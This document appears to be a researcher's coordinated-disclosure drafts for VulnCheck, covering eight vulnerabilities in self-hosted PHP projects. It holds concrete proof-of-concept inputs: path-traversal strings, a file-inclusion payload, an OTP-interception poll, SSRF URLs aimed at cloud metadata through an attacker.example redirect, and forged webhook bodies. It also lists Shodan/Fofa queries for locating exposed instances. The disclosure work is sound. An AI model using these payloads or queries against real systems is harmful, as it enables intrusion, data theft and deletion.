# VulnCheck "Report a Vulnerability" — paste-ready submissions

Form: https://www.vulncheck.com/advisories/report  (email fallback: disclosures@vulncheck.com)
Fields are in the **exact on-screen order** of the form. One submission per finding.
There is a Cloudflare Turnstile ("Success!") + a green **Report Vulnerability** button at the bottom.

## Answers that are IDENTICAL on every submission
- **Name to Credit:** Abdulloh Nuriddinov
- **Email:** abdullohnuriddinov677@gmail.com
- **GitHub Username:** 4bdull0h
- **Are you submitting this find on behalf of someone else?** → No, I discovered this vulnerability myself
- **Would you like VulnCheck to coordinate disclosure for this vulnerability?** → Yes, I would like VulnCheck to handle vendor outreach and coordinate disclosure on my behalf.
- **Have you already reported this finding to the supplier?** → No
- **I have previously requested one or more CVEs from MITRE … no response:** → False
- **Has this vulnerability already been publicly disclosed?** → No
- **Was the vulnerability being reported generated with AI?** → True
- **Do you plan to publish your findings on or after the coordinated disclosure date?** → Yes

Only the per-finding fields below change (Vendor, Product, URL, Tested Version(s),
Vulnerability Details, "Validated on production code?", Shodan/Fofa).

Status: #1–#6 already submitted; #7, #8 ready to submit. (A 9th is appended if/when confirmed.)

================================================================================
# SUBMISSION 1 — repomanager (dist path traversal)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          lbr38
Affected Software: Product name:         repomanager (self-hosted deb/rpm package repository manager, PHP) — distribution name ("dist") parameter in repo create/rebuild
Affected Software: URL:                  https://github.com/lbr38/repomanager
Tested Version(s):                       6.1.0, devel branch @ a7bc264fa94b1cc325239d0c854569959ec83d68 (reviewed 2026-10-09); PHP 8.3
Vulnerability Details:
  CWE-22 / CWE-23 (Path Traversal). Authenticated (user permitted to create/rebuild a deb repo).
  Param\Dist::check() validates the distribution name with Validate::alphaNumeric($dist, ['-','_','.','/']),
  which permits "." and "/" and never rejects "..". The value flows unsanitized through Repo\Repo::setDist()
  into Repo\Metadata\Create / Repo\Metadata\Deb::create(), which build REPOS_DIR/deb/<name>/<dist>/... with no
  canonicalization or containment and pass it to Directory::deleteRecursive() (/usr/bin/rm -rf "<path>") and
  mkdir(recursive). An authenticated user supplies dist = ../../../../../../tmp/CANARY to steer rm -rf / mkdir
  outside REPOS_DIR (default /home/repo). Primary impact: arbitrary recursive directory DELETION as the
  repomanager service account; secondary: arbitrary directory creation / fixed-name metadata writes.
  (Shell command injection is NOT possible — the validator blocks spaces, ; ` $ " — only traversal is reachable.)
  PoC: code-level PoC loads the project's own Validate + Param\Dist and reproduces the Metadata\Create path build
  + deleteRecursive rm -rf form against a sandbox: Param\Dist::check() ACCEPTS "../../../../VICTIM", and the
  resulting rm -rf escapes REPOS_DIR to delete an outside canary. Suggested CVSS 3.1
  AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (8.1 High; use PR:H if the required account is admin-only).
  Fix: validate dist per path segment (^[A-Za-z0-9._-]+$, reject ".."); add realpath containment under REPOS_DIR
  before every rm/mkdir/write; stop shelling out to rm -rf "$path".
Validated on production code?:           I'm not sure  (code-level PoC exercised the project's real classes in a sandbox; not run on a live install)
Shodan/Fofa query:                       http.title:"Repomanager"  (niche; may need manual confirmation)

================================================================================
# SUBMISSION 2 — repomanager (controller PHP file inclusion)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          lbr38
Affected Software: Product name:         repomanager (self-hosted deb/rpm package repository manager, PHP) — AJAX dispatcher /ajax/controller.php
Affected Software: URL:                  https://github.com/lbr38/repomanager
Tested Version(s):                       6.1.0, devel branch @ a7bc264fa94b1cc325239d0c854569959ec83d68 (reviewed 2026-10-09); PHP 8.3
Vulnerability Details:
  CWE-98 / CWE-22 (Improper Control of Filename for Include/Require). Authenticated (any logged-in user, any role; no CSRF check).
  controllers/public/ajax/controller.php (served as /ajax/controller.php) builds the path to include_once() by
  concatenating the raw, unsanitized "controller" POST parameter:
      include_once(ROOT.'/controllers/ajax/'.$_POST['controller'].'.php');
  No ../ / absolute-path / basename allow-list check (a .php suffix is forced; a file_exists() gate applies).
  An authenticated user can traverse out of controllers/ajax/ and include ANY existing local .php file → RCE when
  combined with any writable .php path (upload or log poisoning). App\Main()->Session::load() only requires a valid
  session (no role), and the dispatcher performs no CSRF check.
  PoC: poc reproduces the dispatcher's include line: controller=../../../plant/pwn includes
  .../controllers/ajax/../../../plant/pwn.php and the planted PHP executes.
  Suggested CVSS 3.1 AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (~7.5 High, RCE path), or ~7.1 for arbitrary local .php inclusion only.
  Fix: allow-list the controller name (^[A-Za-z0-9_]+(/[A-Za-z0-9_]+)*$) and realpath-contain under controllers/ajax/
  before including; add a CSRF token check to the dispatcher.
Validated on production code?:           I'm not sure  (PoC of the exact dispatcher include logic; end-to-end RCE needs a .php-plant primitive, not demonstrated)
Shodan/Fofa query:                       http.title:"Repomanager"

================================================================================
# SUBMISSION 3 — iNetPanel (accounts API IDOR)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          tuxxin
Affected Software: Product name:         iNetPanel (self-hosted hosting control panel, PHP) — /api/accounts (api/accounts.php), actions get_user & list_domains
Affected Software: URL:                  https://github.com/tuxxin/iNetPanel
Tested Version(s):                       1.28.0, main @ 9b8c2e46afcef006c6f81871fb7857b4e9fd03c4 (reviewed 2026-10-09)
Vulnerability Details:
  CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-285 (Improper Authorization). Authenticated
  (delegated "subadmin" role). /api/accounts is gated only by Auth::check() (logged in). Most read actions enforce
  the subadmin's assigned-domain scope — list/list_users filter to assigned domains and detail calls
  Auth::canAccessDomain() — but the get_user and list_domains actions perform NO scope check. A subadmin can read
  any hosting account's record and full domain config (document roots, ports, PHP versions, status, disk usage,
  WireGuard peer IP) outside their delegated scope, breaking tenant/reseller isolation. Usernames are predictable
  (create derives them from a domain's first label), so any known hosted domain resolves the target username.
  PoC (as authenticated subadmin): GET /api/accounts?action=get_user&username=<victim>  and
  GET /api/accounts?action=list_domains&username=<victim>  both return the victim's data regardless of assigned domains.
  Suggested CVSS 3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (~4.3; use C:H → ~6.5 if hosting topology is deemed sensitive).
  Fix: apply the same assigned-domain / canAccessDomain check used by detail/list to get_user and list_domains;
  centralize as Auth::canAccessUser().
Validated on production code?:           No  (confirmed by code review of the authorization asymmetry between sibling actions; not run on a live two-role install)
Shodan/Fofa query:                       http.title:"iNetPanel"

================================================================================
# SUBMISSION 4 — smskit (unauthenticated SMS/OTP interception)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          smskit
Affected Software: Product name:         smskit (self-hosted SMS gateway; PHP flat-file backend, Android relay app, REST API) — api/v1/poll.php (also receive.php, report.php)
Affected Software: URL:                  https://github.com/smskit/smskit
Tested Version(s):                       1.0.0, main @ 69e4ed82e62b5dde1647fc5e0187827a0e164284 (reviewed + runtime-tested 2026-10-09); PHP 8.3
Vulnerability Details:
  CWE-306 (Missing Authentication for Critical Function) + CWE-200 (Information Exposure). Unauthenticated.
  api/v1/poll.php requires no authentication. A device is identified only by a caller-supplied device_id query
  parameter (no device token/secret). On each poll the endpoint auto-registers the supplied device_id as an "online"
  device, assigns queued outbound messages to online devices (round-robin by sms_sent_count ascending, so a freshly
  registered device sorts first), and returns the recipient number (to) and full body (message) of queued items,
  marking them "processing". A remote unauthenticated attacker can poll with an arbitrary device_id and receive the
  gateway's queued outbound SMS — typically OTPs, 2FA codes, password-reset links — while diverting them from
  legitimate delivery. receive.php and report.php are unauthenticated too (forged inbound SMS / delivery reports).
  Operator endpoints (send/status/validate/statistics/schedule) DO require an API key via api/v1/_auth.php; the device
  channel has no equivalent.
  PoC (runtime-confirmed): seed a queued message, then
    GET /api/v1/poll.php?device_id=attacker-123&model=Evil&android=99
  returns HTTP 200 {"ok":true,"commands":[{"id":"m1_1","to":"+15551234567","message":"Your bank OTP is 918273..."}]}.
  Reproduced locally with PHP's built-in server against a copy of api/v1/ + a seeded config/.
  Suggested CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L (~8.2 High).
  Fix: issue a per-device secret token at pairing (store hashed), require it on poll/receive/report with hash_equals;
  stop auto-registering unknown devices; or require the existing API key on the device endpoints too.
Validated on production code?:           Yes  (runtime PoC against the project's real api/v1/ code)
Shodan/Fofa query:                       http.html:"smskit"  (niche; confirm manually)

================================================================================
# SUBMISSION 5 — EverShelf (unauthenticated Telegram webhook)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          dadaloop82
Affected Software: Product name:         EverShelf (self-hosted smart pantry manager, PHP) — telegram_webhook public action
Affected Software: URL:                  https://github.com/dadaloop82/EverShelf
Tested Version(s):                       1.11.9, main @ 8923b468510be592f38eb678035e7e0b2519c2cc (reviewed 2026-10-09)
Vulnerability Details:
  CWE-306 (Missing Authentication for Critical Function). Unauthenticated (config-dependent; Low/borderline).
  The telegram_webhook action (public — listed in evershelfPublicActions()) does not verify Telegram's
  X-Telegram-Bot-Api-Secret-Token. The only gate in telegramWebhookHandle() is the optional
  TELEGRAM_ALLOWED_CHAT_IDS allowlist, which is skipped when unset (the default). An unauthenticated attacker POSTs a
  forged Telegram update with an attacker-controlled message.chat.id and text; the handler runs read-only bot
  commands (/lista, /scadenze) and calls telegramApiSend($token, $chatId, $reply), delivering the victim's shopping
  list and expiring-inventory list to the attacker's Telegram chat.
  PoC (allowlist unset, Telegram enabled): POST /api/index.php?action=telegram_webhook  with body
  {"message":{"chat":{"id":<ATTACKER_CHAT_ID>},"text":"/lista"}}  → bot DMs the shopping list to the attacker's chat.
  Suggested CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (~5.3 worst-case; practically Low — read-only, low-sensitivity, config-dependent).
  Fix: verify a configured webhook secret_token via X-Telegram-Bot-Api-Secret-Token (hash_equals) at the start of the
  handler; fail closed when the chat-id allowlist is unset.
Validated on production code?:           No  (confirmed by code review; not run live)
Shodan/Fofa query:                       http.title:"EverShelf"

================================================================================
# SUBMISSION 6 — kuwo-music-relay (unauthenticated, readable SSRF)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          cdyUuu
Affected Software: Product name:         kuwo-music-relay (single-file PHP audio-decrypt relay, decrypt.php) — url= parameter fetcher
Affected Software: URL:                  https://github.com/cdyUuu/kuwo-music-relay
Tested Version(s):                       RELAY_VERSION 1.0.0, main @ 90f76911dc977bf729a8b0bb18118d4ce4c5adb8 (committed 2026-08-19; reviewed + runtime-tested 2026-10-11); PHP 8.3
Vulnerability Details:
  CWE-918 (Server-Side Request Forgery). Unauthenticated. Full-read (not blind).
  decrypt.php?url=<any>&ekey=<...> has no authentication and no destination allow-list. The only SSRF guard is gated
  on RELAY_ALLOW_PRIVATE_IP, which ships = true (guard OFF by default), despite the README advertising "SSRF
  protection". An unauthenticated attacker makes the server fetch arbitrary internal/cloud URLs
  (http://169.254.169.254/, http://127.0.0.1:..., internal APIs). The response is READABLE: the fetched bytes are
  returned as decrypt($data,$offset), and both QMC ciphers (MapCipher, Rc4Cipher) are keystream-XOR derived only from
  the attacker-supplied ekey, so the attacker recovers the fetched bytes verbatim (fetched = output XOR keystream(ekey)).
  Even with the guard enabled, every cURL handle sets CURLOPT_FOLLOWLOCATION=true with no redirect re-validation
  (302 → internal bypass), and isSafeRemoteHost() resolves with gethostbynamel() while cURL re-resolves (DNS-rebinding TOCTOU).
  PoC (runtime-confirmed): on the unmodified default config, a GET for
    /decrypt.php?url=http://127.0.0.1:19999/latest/meta-data/...&ekey=<120 chars>  (Range: bytes=0-63)
  causes the relay to fetch the attacker-chosen internal URL (observed hit carries the relay's hard-coded Chrome UA);
  a harness using the project's own Map/Rc4 ciphers recovers the fetched bytes from the relay's output.
  Suggested CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L (~8.2 High).
  Fix: ship RELAY_ALLOW_PRIVATE_IP=false; allow-list url to Kuwo CDN domains re-validated per redirect hop;
  disable/redir-restrict CURLOPT_FOLLOWLOCATION and re-check each hop; resolve once and pin to the vetted public IP.
Validated on production code?:           Yes  (runtime PoC on the unmodified decrypt.php; cipher-inversion proven with the project's own classes)
Shodan/Fofa query:                       Shodan: http.header:"KuwoRelay"   |   Fofa: header="KuwoRelay"   (the relay sends X-Powered-By: KuwoRelay/<ver>)

================================================================================
# SUBMISSION 7 — pricebuddy (authenticated SSRF via redirect bypass)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          jez500
Affected Software: Product name:         pricebuddy (self-hosted price tracker, Laravel + Filament) — POST /api/meta-extraction; compounded by bundled dependency jez500/web-scraper-for-laravel (^1.0.9)
Affected Software: URL:                  https://github.com/jez500/pricebuddy
Tested Version(s):                       main @ 34f2b2f7ca3b9853d83ec686e46ad74fc0f21e12 (2026-10-05); app version string "development"; PHP 8.3
Vulnerability Details:
  CWE-918 (SSRF) via redirect bypass of an anti-SSRF guard. Authenticated (Sanctum token with the
  meta-extraction:extract ability). POST /api/meta-extraction fetches a caller-supplied url server-side and returns
  extracted data. The url is validated by App\Rules\PublicHttpUrl (resolves host; blocks loopback/RFC1918/link-local/
  cloud-metadata) — but ONLY the initial url. The fetch (bundled jez500/web-scraper-for-laravel:
  Drivers/HttpDriver::fetch() → Http::...->get($url), no ->withoutRedirecting()) follows HTTP redirects (Guzzle
  default, up to 5 hops) and never re-checks the target. An attacker submits url=http://attacker-public-host/ (passes
  the rule); that host replies 302 Location: http://169.254.169.254/... (or 127.0.0.1 / internal) and the scraper
  follows it. The same request also accepts an extraction strategy (store.scrape_strategy.title.{type,value}, type
  regex/xpath/json), so the attacker reads arbitrary slices of the internal response in the returned title/price/image
  → readable SSRF. Also bypassable via DNS rebinding (validate-time vs fetch-time resolution).
  PoC: POST /api/meta-extraction
    {"url":"http://attacker.example/landing","store":{"domains":[{"domain":"attacker.example"}],
     "scrape_strategy":{"title":{"type":"regex","value":"(?s)(.*)"}}}}
  attacker.example passes PublicHttpUrl and 302-redirects to http://169.254.169.254/latest/meta-data/...; the metadata
  body is returned in the title field.
  Suggested CVSS 3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (~7.1 High).
  Fix: disable redirect-following on the scraper client, or re-run PublicHttpUrl on every redirect Location (Guzzle
  on_redirect); resolve once and pin the connection to the vetted IP to defeat DNS rebinding.
Validated on production code?:           I'm not sure  (the real PublicHttpUrl class and the real scraper dependency were exercised at runtime; not run end-to-end on a live deployed instance)
Shodan/Fofa query:                       http.title:"PriceBuddy"

================================================================================
# SUBMISSION 8 — dreeve (unauthenticated Strava webhook forgery → activity deletion)
================================================================================
Name to Credit:                         Abdulloh Nuriddinov
Email:                                  abdullohnuriddinov677@gmail.com
GitHub Username:                         4bdull0h
Submitting on behalf of someone else?:   No, I discovered this vulnerability myself
Affected Software: Vendor name:          robiningelbrecht
Affected Software: Product name:         dreeve (composer robiningelbrecht/dreeve) — self-hosted Strava statistics dashboard (Symfony, PHP 8.5); endpoint POST /strava/webhook
Affected Software: URL:                  https://github.com/dreeveapp/dreeve
Tested Version(s):                       master @ 745074da2ac4aa32d1a68571e90230ddcd82f0c6 (2026-10-13); latest release v5.5.0 at review time
Vulnerability Details:
  CWE-306 (Missing Authentication for Critical Function) + CWE-345 (Insufficient Verification of Data Authenticity).
  Unauthenticated. POST /strava/webhook is a public path (AppAccessMap::PUBLIC_PATHS) and the event handler performs
  NO origin verification: Strava's verify_token only guards the GET hub.challenge handshake, the event's
  owner_id/subscription_id are ignored, and Strava webhooks are unsigned. The only gate is a global "webhooks enabled"
  flag. A forged {"object_type":"activity","aspect_type":"delete","object_id":<id>} is queued as a WebhookEvent; the
  app:strava:webhooks-process cron routes the delete aspect to ActivityRepository::markActivitiesForDeletion()
  (UPDATE Activity SET markedForDeletion=1 ...), after which DeleteActivitiesMarkedForDeletionCommandHandler
  hard-deletes via DeleteActivity → unauthenticated permanent deletion of arbitrary activities. create/update events
  force Strava-API re-imports (quota/DoS). The dashboard is public by default, so the victim's activity IDs are
  enumerable from /activities/{activityId}, allowing the entire history to be wiped.
  PoC: unauthenticated POST /strava/webhook
    {"object_type":"activity","object_id":<victim_activity_id>,"aspect_type":"delete","owner_id":1,
     "subscription_id":1,"event_time":1700000000}
  On the next cron run the activity is marked for deletion and then permanently deleted. Repeat over IDs harvested
  from the public /activities/{id} pages. Preconditions: webhooks enabled + Strava-API import mode (the standard
  live-sync setup); endpoint internet-reachable (required for Strava); fixed path, no secret.
  Suggested CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (~9.1).
  Fix: require a per-instance shared secret on the webhook URL, validated on POST with hash_equals; verify
  owner_id/subscription_id against the configured athlete/subscription; ignore object_ids never imported for this athlete.
Validated on production code?:           No  (confirmed by full code-level sink-chain trace with file/line citations; not reproduced on a live instance — needs PHP 8.5 + DB + the processing cron)
Shodan/Fofa query:                       http.title:"Dreeve"
